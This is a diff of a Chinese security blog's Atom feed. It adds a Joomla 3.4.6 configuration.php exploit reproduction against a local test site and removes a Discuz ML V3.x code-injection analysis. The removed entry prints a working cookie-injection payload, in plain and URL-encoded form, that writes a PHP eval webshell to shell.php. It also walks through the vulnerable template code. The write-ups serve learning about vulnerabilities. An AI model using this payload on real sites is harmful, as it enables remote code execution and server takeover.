@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-10-09T08:58:54.008Z</updated>
+  <updated>2019-10-10T11:28:46.325Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Joomla 3.4.6 configuration.php 漏洞</title>
+    <link href="http://yoursite.com/2019/10/10/Joomla-3-4-6-configuration-php-%E6%BC%8F%E6%B4%9E/"/>
+    <id>http://yoursite.com/2019/10/10/Joomla-3-4-6-configuration-php-漏洞/</id>
+    <published>2019-10-10T06:13:34.000Z</published>
+    <updated>2019-10-10T11:28:46.325Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul><li>Joolma: <a href="https://downloads.joomla.org/it/cms/joomla3/3-4-6" target="_blank" rel="noopener">https://downloads.joomla.org/it/cms/joomla3/3-4-6</a></li><li>EXP: <a href="https://www.exploit-db.com/exploits/47465" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/47465</a></li><li>Target: <a href="http://127.0.0.1/joolma/" target="_blank" rel="noopener">http://127.0.0.1/joolma/</a></li><li>Phpstudy<a id="more"></a></li></ul><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>首先使用脚本检测一下是否存在漏洞<br><img src="/2019/10/10/Joomla-3-4-6-configuration-php-漏洞/vulnerable.png" alt></p><p>然后利用exploit参数进行攻击，因为是本地复现，所以后面监听的端口就随意了<br><img src="/2019/10/10/Joomla-3-4-6-configuration-php-漏洞/exp.png" alt></p><p>图中的框框就是我们shell的地址和密码了，遂用菜刀链接之<br><img src="/2019/10/10/Joomla-3-4-6-configuration-php-漏洞/websehll.png" alt></p><p>再来看看我们的configuration.php中的内容怎么样了<br><img src="/2019/10/10/Joomla-3-4-6-configuration-php-漏洞/conf.png" alt><br>发现在我们的文件最后面添加上了一句话</p><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p><a href="https://www.cnblogs.com/magic-zero/p/11643916.html" target="_blank" rel="noopener">https://www.cnblogs.com/magic-zero/p/11643916.html</a><br><img src="/2019/10/10/Joomla-3-4-6-configuration-php-漏洞/reson.png" alt></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;ul&gt;
+&lt;li&gt;Joolma: &lt;a href=&quot;https://downloads.joomla.org/it/cms/joomla3/3-4-6&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://downloads.joomla.org/it/cms/joomla3/3-4-6&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;EXP: &lt;a href=&quot;https://www.exploit-db.com/exploits/47465&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.exploit-db.com/exploits/47465&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Target: &lt;a href=&quot;http://127.0.0.1/joolma/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://127.0.0.1/joolma/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Phpstudy&lt;/li&gt;&lt;/ul&gt;
+    
+    </summary>
+    
+    
+    
+      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+  </entry>
   
   <entry>
     <title>MS17_010漏洞复现</title>
@@ -210,31 +235,6 @@
     
     
       <category term="注入" scheme="http://yoursite.com/tags/%E6%B3%A8%E5%85%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Discuz ML V3.x代码注入漏洞分析</title>
-    <link href="http://yoursite.com/2019/07/22/Discuz-ML-V3-x%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    <id>http://yoursite.com/2019/07/22/Discuz-ML-V3-x代码注入漏洞分析/</id>
-    <published>2019-07-22T12:26:35.000Z</published>
-    <updated>2019-07-23T03:21:54.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>自己跟踪复现学习一下咯~</p><ul><li><a href="http://discuz.ml/download" target="_blank" rel="noopener">http://discuz.ml/download</a></li><li>phpstorm</li><li>phpstudy</li><li>burpsuite</li></ul><a id="more"></a><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>搭建好环境,然后我们修改下语言，这里我切换成英语<br><img src="/2019/07/22/Discuz-ML-V3-x代码注入漏洞分析/en.png" alt></p><p>抓包，在language参数这里<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /discuzx3/upload/ HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/discuzx3/upload/</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: 23wi_2132_saltkey=H11n918t; 23wi_2132_lastvisit=1563795324; 23wi_2132_sid=S8IWzW; 23wi_2132_language=en; 23wi_2132_onlineusernum=1; 23wi_2132_sendmail=1; 23wi_2132_lastact=1563799281%09index.php%09</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure></p><p>添加 <strong>‘.phpinfo().’</strong> ,就复现成功啦~<br><img src="/2019/07/22/Discuz-ML-V3-x代码注入漏洞分析/phpinfo.png" alt></p><p>exp:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&apos;.file_put_contents(&apos;shell.php&apos;,urldecode(&apos;&lt;?php eval($_POST[&quot;mo&quot;]);?&gt;&apos;)).&apos;</span><br><span class="line"></span><br><span class="line">%27.file_put_contents%28%27shell.php%27%2Curldecode%28%27%253c%253fphp%2520eval%28%2524_%2550%254F%2553%2554%255b%2522mo%2522%255d%29%253b%253f%253e%27%29%29.%27</span><br></pre></td></tr></table></figure></p><p>将一句话写入到shell.php中<br><img src="/2019/07/22/Discuz-ML-V3-x代码注入漏洞分析/shell.png" alt></p><p>上菜刀就能连shell了<br><img src="/2019/07/22/Discuz-ML-V3-x代码注入漏洞分析/caidao.png" alt></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>phpstorm启动~</p><p>这里应该是可以通过报错来查找对应的脚本文件的，但是测了半天没有弄出来。。。。 放张图感受一下<br><img src="/2019/07/22/Discuz-ML-V3-x代码注入漏洞分析/path.png" alt><br>然后跟踪到这个 <strong>source/module/portal/portal_index.php</strong><br><img src="/2019/07/22/Discuz-ML-V3-x代码注入漏洞分析/portal_index.png" alt></p><p>然后发现phpstrom跟踪不了这个函数，于是乎转战sublime，装了个插件==<br><img src="/2019/07/22/Discuz-ML-V3-x代码注入漏洞分析/portal_index_2.png" alt></p><p>然后跟踪到了 <strong>source/function/function_core.php</strong> 中的 <strong>template</strong> 这个函数</p><p>这里的代码很长，我们直接看到 line 644:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cachefile = &apos;./data/template/&apos;.DISCUZ_LANG.&apos;_&apos;.(defined(&apos;STYLEID&apos;) ? STYLEID.&apos;_&apos; : &apos;_&apos;).$templateid.&apos;_&apos;.str_replace(&apos;/&apos;, &apos;_&apos;, $file).&apos;.tpl.php&apos;;</span><br></pre></td></tr></table></figure></p><p>这里定义了这个缓存的脚本路径，那么可想这里肯定是DISCUZ_LANG这个参数出问题了。</p><p>跟踪这个函数，来到了 source/class/discuz/discuz_application.php<br><img src="/2019/07/22/Discuz-ML-V3-x代码注入漏洞分析/lng.png" alt></p><p>这里可以看出，我们的DISCUZ_LANG参数是从cookie中的language参数传递进来的，并且在 <strong>/data/template/</strong> 目录下创建了文件。<br><img src="/2019/07/22/Discuz-ML-V3-x代码注入漏洞分析/template.png" alt><br>之前测试的，看来真的创建了文件啊。</p><p>但是创建了文件，为什么能利用呢。</p><p>这里写个脚本测试一下，成功打开了phpinfo界面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function check()&#123;&#125;</span><br><span class="line">include &apos;&apos;.phpinfo().&apos;.php&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/2019/07/22/Discuz-ML-V3-x代码注入漏洞分析/include.png" alt><br>我们也发现编辑器里面的 <strong>phpinfo()</strong> 字样被标亮出来了，说明这段代码是被执行了的</p><p>所以我们只要将文件名定义成：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;.phpinfo().&apos;.php</span><br></pre></td></tr></table></figure></p><p>就能够触发。</p><p>总结一下：</p><p>我们的 <strong>DISCUZ_LANG</strong> 参数同理，将脚本的名称命名为代码，然后利用 require、require once 就能够利用到了</p><p>学到了学到了 :)</p><p>那么我们在这里搜索 <strong>include_once template(</strong> 关键字，也能触发这样利用的条件。</p><p><img src="/2019/07/22/Discuz-ML-V3-x代码注入漏洞分析/find_more.png" alt></p><p>嘻嘻。</p><p>不过这个漏洞出来也十多天了，希望下次有漏洞尽早跟踪复现学习一下。</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;自己跟踪复现学习一下咯~&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;http://discuz.ml/download&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://discuz.ml/download&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;phpstorm&lt;/li&gt;
-&lt;li&gt;phpstudy&lt;/li&gt;
-&lt;li&gt;burpsuite&lt;/li&gt;
-&lt;/ul&gt;
-    
-    </summary>
-    
-    
     
   </entry>
   
